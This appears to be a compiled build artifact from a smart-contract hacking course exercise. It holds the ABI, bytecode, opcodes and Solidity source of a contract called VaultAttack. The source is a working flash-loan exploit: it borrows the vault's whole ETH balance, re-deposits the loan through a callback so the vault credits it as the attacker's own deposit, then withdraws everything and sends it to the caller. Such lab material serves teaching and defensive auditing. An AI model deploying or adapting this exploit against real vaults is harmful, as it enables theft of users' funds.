{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_vault",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "callBack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "vault",
      "outputs": [
        {
          "internalType": "contract IAdvancedVault",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "608060405234801561001057600080fd5b506040516102a73803806102a783398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b610214806100936000396000f3fe6080604052600436106100385760003560e01c80636347f70e146100445780639e5faafc1461004e578063fbfa77cf1461006357600080fd5b3661003f57005b600080fd5b61004c61009f565b005b34801561005a57600080fd5b5061004c6100f5565b34801561006f57600080fd5b50600054610083906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b336001600160a01b031663f6326fb3346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156100da57600080fd5b505af11580156100ee573d6000803e3d6000fd5b5050505050565b6000546040516302d8f62760e51b81526001600160a01b039091168031600483015290635b1ec4e090602401600060405180830381600087803b15801561013b57600080fd5b505af115801561014f573d6000803e3d6000fd5b50506000805460408051633821b97b60e21b815290516001600160a01b03909216945063e086e5ec9350600480820193929182900301818387803b15801561019657600080fd5b505af11580156101aa573d6000803e3d6000fd5b50506040513392504780156108fc029250906000818181858888f193505050501580156101db573d6000803e3d6000fd5b5056fea264697066735822122080875e32a76c91d0627ae69d0ed5e5fe481d7e7fa59c202924dd3dcbfe42e64064736f6c63430008130033",
  "bytecodeSha1": "98aed22bdae211b1ce52ceb181ba22cb64a44de0",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.19+commit.7dd6d404"
  },
  "contractName": "VaultAttack",
  "language": "Solidity",
  "natspec": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6347F70E EQ PUSH2 0x44 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0xFBFA77CF EQ PUSH2 0x63 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLDATASIZE PUSH2 0x3F JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4C PUSH2 0x9F JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x4C PUSH2 0xF5 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x6F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 SLOAD PUSH2 0x83 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xF6326FB3 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xDA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xEE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x2D8F627 PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP1 BALANCE PUSH1 0x4 DUP4 ADD MSTORE SWAP1 PUSH4 0x5B1EC4E0 SWAP1 PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x13B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x14F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x3821B97B PUSH1 0xE2 SHL DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP5 POP PUSH4 0xE086E5EC SWAP4 POP PUSH1 0x4 DUP1 DUP3 ADD SWAP4 SWAP3 SWAP2 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x196 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1AA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD CALLER SWAP3 POP SELFBALANCE DUP1 ISZERO PUSH2 0x8FC MUL SWAP3 POP SWAP1 PUSH1 0x0 DUP2 DUP2 DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x1DB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP1 DUP8 0x5E ORIGIN 0xA7 PUSH13 0x91D0627AE69D0ED5E5FE481D7E PUSH32 0xA59C202924DD3DCBFE42E64064736F6C63430008130033000000000000000000 ",
  "sha1": "c8f9a22a1dba32ab7d9f3f92f6dc7f35e5ac3e1f",
  "source": "// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE\n// https://smartcontractshacking.com/#copyright-policy\npragma solidity ^0.8.13;\n\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"hardhat/console.sol\";\ninterface IAdvancedVault{\n    function depositETH() external payable;\n    function withdrawETH() external;\n    function flashLoanETH(uint256 amount) external;\n}\n\ncontract VaultAttack  {\n    using Address for address payable;\n    //IAdvancedVault immutable vault;\n    IAdvancedVault public vault;\n\n    constructor(address _vault){\n        vault = IAdvancedVault(_vault);\n\n    }\n    function callBack() external payable {\n\n        IAdvancedVault(msg.sender).depositETH{value: msg.value}();\n\n    }\n\n    function attack() external {\n        vault.flashLoanETH(address(vault).balance);\n        vault.withdrawETH();\n        payable(msg.sender).transfer(address(this).balance);\n\n    }\n\n    receive() external payable{}\n}\n\n",
  "sourcePath": "contracts/flash-loan-attacks-2/VaultAttack.sol",
  "type": "contract"
}